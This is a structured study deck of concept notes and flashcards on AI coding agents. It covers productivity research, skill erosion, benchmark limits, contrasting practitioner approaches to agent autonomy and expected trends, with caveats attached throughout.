concepts.s: Headless agents triggered from CI, issue assignment or schedules turn agent work into an asynchronous team pipeline, which also makes them a new privileged attack surface.

concepts.s: Rigorous evidence on coding-agent productivity is thin and mixed: self-reports and throughput metrics are rising, while controlled studies have found slowdowns, measurement breakdowns and stability costs.

x.b:
• METR's 2025 randomized trial found experienced open-source developers were 19% slower with early-2025 AI tools, while believing they had been sped up.
  • Per Rob Bowley's April 2026 summary of METR's February 2026 update, METR's follow-up could not produce reliable results: developers now relied on AI so heavily they would not work without it, so there was no usable control group, and changed working patterns broke simple time-on-task measurement. METR believes productivity is improving but published no new figure.
  • Bowley adds that these studies cover individual tasks by open-source contributors, not teams on production codebases.

Anthropic's December 2025 study of its own staff (132 survey responses, 53 interviews, about 200,000 Claude Code transcripts):

  • Claude use rose from 28% to about 59% of daily work; self-reported productivity gains rose from +20% to +50%.
  • Merged PRs per engineer per day rose 67% after org-wide adoption.
  • 27% of Claude-assisted work would not have been done otherwise.
  • More than half said they can fully delegate only 0 to 20% of their work.
  • Maximum consecutive tool calls rose from 9.8 to 21.2 while human turns fell from 6.2 to 4.1.

Its stated limitations: non-anonymous employees, partly convenience sampling, recall bias, and models from mid-2025.

Google's 2025 DORA report (nearly 5,000 respondents, via InfoQ) found roughly 90% AI use, with AI acting as an amplifier of existing strengths and dysfunctions. AI adoption now correlates with higher delivery throughput but also higher delivery instability, and the researchers found no evidence that faster repair offsets the instability. Over 80% believe AI raised their productivity, while trust in AI output stays low.

Synthesis: Self-reports overstate gains (METR's perception gap), and PR counts reward volume. Track outcome metrics that include rework: lead time to production, change failure rate, time to restore, review latency and the share of agent PRs reverted or heavily rewritten. Compare like-for-like work types, since agents shift the mix toward small fixes and work that would not otherwise have been done.

Trap: Quoting the 19% slowdown as current truth. It measured early-2025 tools, and METR itself says its newer measurements are unreliable.
Trap: Quoting vendor self-reports as causal evidence. Anthropic's own study lists non-anonymity and recall bias.
Trap: Celebrating throughput while instability rises. DORA found both move together.

concepts.n: Skill formation and the changing engineer role
concepts.s: Heavy delegation can erode the skills needed to supervise agents, so strong engineers and teams choose interaction patterns that keep understanding in the loop while the role shifts toward design, specification and review.

x.b:
Anthropic's January 2026 randomized trial had 52 mostly junior engineers learn the Trio async library. The AI-assisted group averaged 50% on a follow-up quiz versus 67% for hand-coders (Cohen's d of 0.738, p of 0.01), with the largest gap on debugging, and finished only about two minutes faster, which was not significant.

  • Patterns that preserved learning: asking only conceptual questions, requesting code with explanations, and generating code then asking follow-ups to understand it.
  • Patterns that harmed it: full delegation, progressive reliance, and using AI to debug instead of to understand.

Caveats from the authors: small sample, short-term quiz, and a chat sidebar instead of an agentic tool, which they expect could have larger effects.

Trap: Assuming review skill substitutes for writing skill. Karpathy reports the two diverge.

concepts.n: Evaluating agents: benchmarks versus your own work
concepts.s: Public benchmarks show agent capability rising fast on well-specified tasks, but only an evaluation on your own repositories, with your own checks and review standards, tells you what a tool will do for your team.

x.b:
METR measures the length of tasks, in skilled-human time, that a model completes with 50% reliability. As reported by OfficeChai in February 2026, Claude Opus 4.6 scored a 50% horizon of about 14.5 hours with a very wide confidence interval (6 to 98 hours), and the fitted trend since 2023 doubles about every 123 days.

  • METR warned its task suite is near saturation, which distorts estimates.
  • The tasks are well-specified and self-contained, closer to a contractor brief than a real job.
  • Performance drops substantially when work is judged holistically instead of by automated criteria.

Synthesis: SWE-bench style leaderboards measure whether an agent can resolve real GitHub issues against hidden tests. Scores at the top cluster closely, public repositories raise contamination risk, and harness and scaffolding choices move results as much as the model does. Treat a few points of difference as noise and newer, harder variants as more informative than saturated ones.

Carlini's C compiler post is a useful corrective: the agents passed huge test suites, yet new features often broke old ones and the code was well below expert quality. Passing tests did not mean done.

1. Pick 10 to 20 recently closed tickets of different types from your own repos, with the merged fix as reference.
  2. Give each tool the same ticket text, the same instruction file and the same check commands.
  3. Score passing checks, reviewer minutes to reach mergeable, rework needed, cost, and any policy violation such as touching tests or unrelated files.
  4. Repeat after major model releases, since rankings shift.
Synthesis: For a BI team, include a dbt model change with data tests, a SQL performance fix with an explain-plan check, and a dashboard change verified by screenshot.

Trap: Reading a 50% time horizon as "can do a 14-hour job." It means a coin-flip success rate on clean, well-specified tasks.
Trap: Judging tools on demos. Your messy legacy repo and review standards are the real benchmark.

cards.q: What does METR's 50% time horizon measure?
cards.a: The length of task, in skilled-human time, that a model completes successfully half the time.

cards.q: What doubling time did METR's fitted trend show for time horizons as of early 2026?
cards.a: About 123 days, roughly every four months.

cards.q: Why does METR caution that time-horizon results overstate real-job readiness?
cards.a: The tasks are well-specified and self-contained, and performance drops substantially under holistic grading.

cards.q: Name three metrics to score in an internal agent evaluation.
cards.a: Passing checks, reviewer minutes to reach a mergeable state, rework needed (also cost and policy violations).

concepts.s: One school of top practitioners treats agents as powerful but fallible collaborators and keeps the engineer responsible for design, tests and review, trading some speed for code they understand.

x.b:
• Agentic Engineering Patterns guide (February 2026), with chapters such as "Writing code is cheap now" and red/green TDD; he defines agentic engineering as professionals amplifying expertise with agents that write and run code.
  • Coined "prompt injection" and the lethal trifecta; advises living dangerously only inside a sandbox.
  • Parallel agents for research, explanations, chores and specified work, with review as the hard limit.

• Beck: "augmented coding", where "you care about the code, its complexity, the tests, & their coverage," versus vibe coding where you care only about behavior. TDD system prompt, structural and behavioral changes in separate commits, and three warning signs (loops, unrequested features, cheating on tests).
  • Ronacher ("A Year Of Vibes", December 2025): works almost entirely through agents as an engineering lead, still reviews heavily, prefers simple code and fewer dependencies, finds MCP does not work for him, and argues failed attempts carry value and review should live in version control.

His February 2026 adoption journey is the clearest on-ramp: drop the chatbot for an agent; reproduce your own work; start end-of-day agents; outsource the slam dunks; engineer the harness; aim to always have an agent running. He is candid that for a long stretch agents felt no faster than doing the work himself, and that his always-on goal is still aspirational.

• Karpathy (X posts, early 2026): the 80/20 flip to agent-driven coding, "mostly programming in English now", a catalogue of model failure modes, watch output "like a hawk" on code that matters, and a predicted 2026 "slopacolypse" of almost-right content.
  • Reed: the spec, plan, todo pipeline with one-question-at-a-time interviews, and a warning about getting "over my skis."

Synthesis: This school converges on: specs and tests written or approved by a human, small reviewable diffs, heavy use of agents for research and chores, sandboxes for autonomy, and continuous harness improvement. Its cost is a review ceiling on throughput, which it accepts in exchange for understanding the codebase.

cards.q: How does Kent Beck distinguish augmented coding from vibe coding?
cards.a: In augmented coding you care about the code, its complexity, the tests and coverage; in vibe coding you care only about the system's behavior.

cards.q: Name Hashimoto's six adoption steps.
cards.a: Drop the chatbot, reproduce your own work, end-of-day agents, outsource the slam dunks, engineer the harness, always have an agent running.

cards.q: What does Ronacher think code review needs to become?
cards.a: Part of the version control system, with prompts and failed attempts visible to teammates.

cards.q: What is Karpathy's predicted 2026 slopacolypse?
cards.a: A flood of low-quality, almost-right AI-generated content across code repositories, papers and social media.

concepts.s: A second school pushes autonomy and parallelism as far as current models allow, reading less code and investing in loops, orchestration and verification instead, with results that are impressive and openly contested.

x.b:
• The Ralph loop: one prompt file, an infinite bash loop, specs and a fix plan on disk, tests as backpressure.
  • "Deterministically bad in an undeterministic world": failures are predictable, so you tune the prompt instead of babysitting each step.
  • Earlier "stdlib" work on building libraries of reusable rules.

Yegge released Gas Town, an open-source orchestrator for many Claude Code or Codex agents, on January 1, 2026. Roles include a Mayor that decomposes work into tasks stored in his Beads tracker, short-lived worker agents each in its own git worktree, a Refinery that merges and checks output, and watchdog agents that restart stuck ones. In a March 2026 conversation with Tim O'Reilly he urged developers to stop reading code ("Code is a liquid").

Maggie Appleton's January 2026 analysis treats Gas Town as design fiction: valuable patterns (persistent roles with disposable sessions, continuous work queues, merge management) wrapped in an ad hoc design, with agents that stall, forget and duplicate work, and costs she estimates at $2,000 to $5,000 a month.

• Steinberger ("Shipping at Inference-Speed", December 2025): mostly Codex, 3 to 8 projects in parallel, commits to main, rarely reads code, and "the amount of software I can create is now mostly limited by inference time." He joined OpenAI in February 2026.
  • Cherny: about five local plus 5 to 10 web sessions, Opus with thinking for all coding, plan first, shared CLAUDE.md, slash commands, a formatting hook, and verification as the top tip. He almost never skips permissions outside a sandbox.

• DORA 2025 links AI adoption to higher throughput and higher instability at the same time.
  • Karpathy's failure catalogue (wrong assumptions, bloat, dead code) is exactly what goes unseen when nobody reads the code.
  • Carlini's compiler shows verified autonomy at scale, and also new features breaking old ones and below-expert code.
Synthesis: The maximalist approach works best where verification is strong and the cost of a defect is low: greenfield tools, prototypes, personal software and well-tested libraries. In regulated systems the same techniques apply, but with humans owning specs, tests and merge.

cards.q: What is Gas Town?
cards.a: Steve Yegge's open-source orchestrator that runs many coding agents in parallel with specialized roles, worker agents in separate worktrees, and a Beads task tracker.

cards.q: What does Steinberger say now limits how much software he can create?
cards.a: Mostly inference time.

cards.q: What is Huntley's tagline for Ralph's failure behavior?
cards.a: Deterministically bad in an undeterministic world, meaning failures are predictable and fixable by tuning the prompt.

cards.q: What monthly cost range did Appleton estimate for Yegge's Gas Town usage?
cards.a: About $2,000 to $5,000 a month.

concepts.s: Agents are moving toward longer autonomous runs, teams of specialized agents and asynchronous cloud execution, which shifts the human bottleneck toward specification, verification design and review.

x.b:
• METR's time-horizon trend has doubled roughly every four months, though on clean tasks.
  • Anthropic's harness posts report multi-hour autonomous app builds, and harnesses getting simpler as Opus 4.5 and 4.6 removed the need for context resets and sprints.
  • Products now ship the pieces: goal conditions, background agent views, scheduled automations and cloud sessions that keep running after you close your laptop.

• Appleton: when agents write the code, design becomes the limiting factor.
  • Willison: review capacity caps how much parallel output is useful.
  • Anthropic's internal study: engineers keep high-level design and taste decisions and delegate work that is easy to verify.
Synthesis: The scarce skills are becoming: writing specs an agent can execute, designing verifiers that catch what matters, decomposing work into independent units, and reviewing fast without losing judgment. These map closely onto senior and staff engineering skills, which is why experienced engineers tend to get more from agents.

• Security: the Clinejection incident shows agents in CI are already being attacked through prompt injection.
  • Quality and stability: DORA's throughput-with-instability finding and Karpathy's slopacolypse warning.
  • Skills: Anthropic's trial on learning, and practitioner reports of atrophy.
  • Measurement: METR could no longer run a clean control group, so evidence will lag practice.

Synthesis: A practical 12-month progression: (1) master the single-session loop with verification on every task; (2) build a shared instruction file, three or four skills and one hook for your team; (3) run two or three parallel sessions in worktrees with a WIP limit; (4) build one long-running harness with a progress file and evaluator for a well-tested side project; (5) put a least-privilege agent into CI for triage or review. Re-read your harness after every major model release and delete what is no longer load-bearing.

cards.q: According to Appleton, what becomes the limiting factor when agents write the code?
cards.a: Design: deciding what to build and how it should work.

cards.q: What types of work did Anthropic engineers report delegating most readily?
cards.a: Work that is easy to verify, low-stakes, repetitive or outside their own context, while keeping high-level design and taste decisions.

cards.q: Why does evidence on agent productivity lag practice?
cards.a: Adoption is so widespread that clean control groups are disappearing, as METR found in 2026.

cards.q: What should you do to your harness after a major model release?
cards.a: Re-examine it and remove components that are no longer load-bearing, adding new ones only where the new model has headroom.
